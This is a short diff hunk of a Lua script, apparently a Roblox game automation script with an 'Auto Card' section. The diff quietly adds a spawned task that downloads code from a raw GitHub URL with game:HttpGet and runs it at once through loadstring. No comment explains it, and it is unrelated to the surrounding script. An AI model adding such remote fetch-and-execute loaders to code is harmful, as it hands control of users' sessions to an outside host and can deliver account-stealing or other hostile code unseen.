@@ -312,6 +312,12 @@ task.spawn(function()
     end
 end)
 
+task.spawn(function()
+    if player then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NawusG/What/refs/heads/Ongtauwnhub/1/2/4"))()
+    end
+end)
+
 -----------------------------------------  Auto Card  -------------------------------------------------
 
 -- local Priority = {
